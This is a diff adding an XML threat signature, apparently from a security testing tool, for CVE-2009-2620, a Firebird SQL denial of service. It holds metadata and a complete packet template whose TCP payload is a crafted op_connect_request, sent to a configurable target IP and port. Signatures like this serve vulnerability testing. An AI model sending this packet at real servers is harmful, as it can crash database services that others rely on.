@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Firebird SQL op_connect_request Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability exists in Firebird SQL. The vulnerability is due to the way that Firebird SQL handles op_connect_request requests. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted op_connect_request request to a vulnerable server. A successful attack would create a denial of service condition on the Firebird SQL service."/>
+    <Intent display="true">
+      <item value="Denial_of_Service/Design_Weakness"/>
+    </Intent>
+    <Protocol display="true" value="Interbase"/>
+    <Type_Of_Equipment display="true">
+      <item value="Database"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Firebird"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Firebird_Foundation_Firebird"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Firebird_Foundation_Firebird_1.5.x_prior_to_1.5.6&amp;2.0.x_prior_to_2.0.6&amp;2.1.x_prior_to_2.1.3&amp;2.5.x_prior_to_2.5_Beta_2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2009-2620"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="b6792db9526143c36d5d9120dff53e16"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633965812599955918"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1260873025" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="I"/>
+    <NamedVar name="IBdestPort" type="ImperfectControls.Port" value="null" index="J"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="I"/>
+      <for index="J"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:51:5A:8E" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0047" Identification="02B9" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="D66E" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="39644" destPort="$IBdestPort" SeqNumber="02D39FAF" AckNumber="2AD078F6" HeaderLength="08" WindowSize="002E" Checksum="F481" UrgentPointer="0000" Options="0101080A8C3A9D2000000000" Payload="00000035414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
